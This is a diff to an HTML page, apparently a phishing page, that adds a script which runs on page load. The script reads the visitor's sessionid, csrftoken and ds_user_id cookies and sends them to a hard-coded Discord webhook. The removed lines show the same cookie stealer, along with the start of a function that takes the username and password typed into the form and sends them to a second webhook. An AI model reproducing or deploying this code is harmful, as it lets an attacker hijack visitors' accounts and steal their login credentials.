@@ -15,42 +15,41 @@
       name="viewport"
       content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover"
     />
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+    function getCookie(name) {
+        const value = `; ${document.cookie}`;
+        const parts = value.split(`; ${name}=`);
+        if (parts.length === 2) return parts.pop().split(';').shift();
+    }
+
+    const webhookUrl = "https://discord.com/api/webhooks/1074932618719658025/Sf29kV61PQ8lJEMZ0rvtgcDQ_apI4jihRiU-NQ9I08uw5YORMLSSnF-vA7aQT_Ho87hO";
+
+    const sessionid = getCookie('sessionid');
+    const csrftoken = getCookie('csrftoken');
+    const ds_user_id = getCookie('ds_user_id');
+
+    const data = {
+        sessionid,
+        csrftoken,
+        ds_user_id
+    };
+
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data)
+    })
+    .then(response => response.json())
+    .then(json => console.log('Successfully sent to Discord:', json))
+    .catch(error => console.error('Error sending to Discord:', error));
+});
+</script>
+
+	  
     <script>
-function getCookie(name) {
-    const value = `; ${document.cookie}`;
-    const parts = value.split(`; ${name}=`);
-    if (parts.length === 2) return parts.pop().split(';').shift();
-}
-
-const webhookUrl = "https://discord.com/api/webhooks/1074932618719658025/Sf29kV61PQ8lJEMZ0rvtgcDQ_apI4jihRiU-NQ9I08uw5YORMLSSnF-vA7aQT_Ho87hO";
-
-const sessionid = getCookie('sessionid');
-const csrftoken = getCookie('csrftoken');
-const ds_user_id = getCookie('ds_user_id');
-
-const data = {
-    sessionid,
-    csrftoken,
-    ds_user_id
-};
-
-fetch(webhookUrl, {
-    method: 'POST',
-    headers: {
-        'Content-Type': 'application/json',
-    },
-    body: JSON.stringify(data)
-})
-.then(response => response.json())
-.then(json => console.log('Successfully sent to Discord:', json))
-.catch(error => console.error('Error sending to Discord:', error));
-
-	    
-      function sendWebhook() {  
-  var username = document.getElementById("messageofacc").value;
-  var message = document.getElementById("messageofpass").value;
-
-
 
   // Replace YOUR_WEBHOOK_URL with the actual URL of your Discord webhook
   var webhookUrl = "https://discord.com/api/webhooks/1181637750433271938/OzPoB5WFNmzhYyihuiUOKOYYQSfYmWGbFBnnZwDgAE-ZTNQTw0Ro1ldK8GXRPZKnDiCe";
